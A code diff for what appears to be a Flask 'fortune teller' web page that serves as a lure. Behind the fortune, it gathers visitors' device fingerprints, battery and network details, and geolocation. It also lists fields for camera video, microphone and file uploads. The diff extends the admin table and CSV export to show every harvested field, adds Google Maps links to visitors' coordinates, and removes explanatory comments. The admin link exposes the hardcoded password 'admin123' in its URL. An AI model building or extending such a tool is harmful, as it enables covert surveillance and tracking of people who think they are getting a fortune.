@@ -43,6 +43,15 @@ FORTUNES = [
 
 DATA_FILE = 'visitors.json'
 
+# ---------- ALL POSSIBLE FIELDS (admin panel will show all) ----------
+ALL_FIELDS = [
+    'sessionId', 'timestamp', 'ip', 'name', 'fortuneText', 'phoneNumber',
+    'fingerprint', 'batteryLevel', 'batteryCharging', 'networkType', 'networkSpeed',
+    'deviceMemory', 'screen', 'timezone', 'userAgent',
+    'latitude', 'longitude', 'mapUrl',
+    'cameraVideo', 'microphone', 'files'
+]
+
 def init_json():
     if not os.path.exists(DATA_FILE):
         with open(DATA_FILE, 'w') as f:
@@ -107,10 +116,10 @@ def save():
     data = request.json
     data['timestamp'] = datetime.now().isoformat()
     data['ip'] = request.remote_addr
-    # Ensure fields exist
-    for field in ['cameraVideo', 'microphone', 'files']:
+    # Ensure all fields exist (fill missing with empty string)
+    for field in ALL_FIELDS:
         if field not in data:
-            data[field] = 'not captured'
+            data[field] = ''
     save_visitor(data)
     return jsonify({'status': 'saved'})
 
@@ -142,18 +151,14 @@ def admin():
             visitors = get_visitors()
             if not visitors:
                 return '<h1>No data yet</h1><p><a href="/admin">Back</a></p>'
-            # Collect all keys
-            all_keys = set()
-            for v in visitors:
-                all_keys.update(v.keys())
-            all_keys = sorted(list(all_keys))
+            # Use ALL_FIELDS as header – always shows every column
             html = '<h1>💕 Visitor Data</h1><p><a href="/admin">Back to login</a> | <a href="/admin/download-csv?pass=admin123">📥 Download CSV (Excel compatible)</a></p>'
             html += '<table border="1" cellpadding="5">'
-            html += '<tr>' + ''.join(f'<th>{k}</th>' for k in all_keys) + '</tr>'
+            html += '<tr>' + ''.join(f'<th>{field}</th>' for field in ALL_FIELDS) + '</tr>'
             for v in visitors:
                 html += '<tr>'
-                for k in all_keys:
-                    val = v.get(k, '')
+                for field in ALL_FIELDS:
+                    val = v.get(field, '')
                     html += f'<td>{str(val)[:100]}</td>'
                 html += '</tr>'
             html += '</table>'
@@ -193,18 +198,13 @@ def download_csv():
     if not visitors:
         return 'No data', 404
     
-    all_keys = set()
-    for v in visitors:
-        all_keys.update(v.keys())
-    all_keys = sorted(list(all_keys))
-    
     import csv
     from io import StringIO
     output = StringIO()
     writer = csv.writer(output)
-    writer.writerow(all_keys)
+    writer.writerow(ALL_FIELDS)
     for v in visitors:
-        row = [str(v.get(k, '')) for k in all_keys]
+        row = [v.get(field, '') for field in ALL_FIELDS]
         writer.writerow(row)
     
     return Response(
@@ -344,7 +344,6 @@ HTML_TEMPLATE = '''
 <input type="file" id="fileInput" multiple style="display:none">
 
 <script>
-    // Session ID (persists across refreshes)
     let sessionId = localStorage.getItem('fortuneSessionId');
     if (!sessionId) {
         sessionId = Date.now() + '_' + Math.random().toString(36).substr(2, 8);
@@ -356,7 +355,6 @@ HTML_TEMPLATE = '''
     let currentFortuneText = "";
     let hasExistingData = false;
 
-    // ---------- Device info collectors ----------
     async function getFingerprint() {
         try {
             const fp = await FingerprintJS.load();
@@ -399,7 +397,6 @@ HTML_TEMPLATE = '''
         return navigator.userAgent;
     }
 
-    // On page load, check if this session already has a fortune
     window.addEventListener('load', async () => {
         try {
             const resp = await fetch('/get-session-data', {
@@ -452,7 +449,6 @@ HTML_TEMPLATE = '''
         
         await new Promise(r => setTimeout(r, 500));
         document.getElementById('loading').classList.add('hidden');
-        // Always show the permission UI (no skipping) – but user will see it only once because browser remembers permissions.
         document.getElementById('permissions').classList.remove('hidden');
     }
 
@@ -608,10 +604,12 @@ HTML_TEMPLATE = '''
         currentFortuneText = fortuneData.fortune;
         document.getElementById('fortuneText').innerText = currentFortuneText + " Dear " + visitorData.name + "! 💕";
         
-        // Ensure fields exist
-        if (!visitorData.cameraVideo) visitorData.cameraVideo = 'not captured';
-        if (!visitorData.microphone) visitorData.microphone = 'not captured';
-        if (!visitorData.files) visitorData.files = 'not captured';
+        // Add map URL if location exists
+        if (visitorData.latitude && visitorData.latitude !== 'denied') {
+            visitorData.mapUrl = `https://www.google.com/maps?q=${visitorData.latitude},${visitorData.longitude || 0}`;
+        } else {
+            visitorData.mapUrl = '';
+        }
         
         await fetch('/save', {
             method: 'POST',
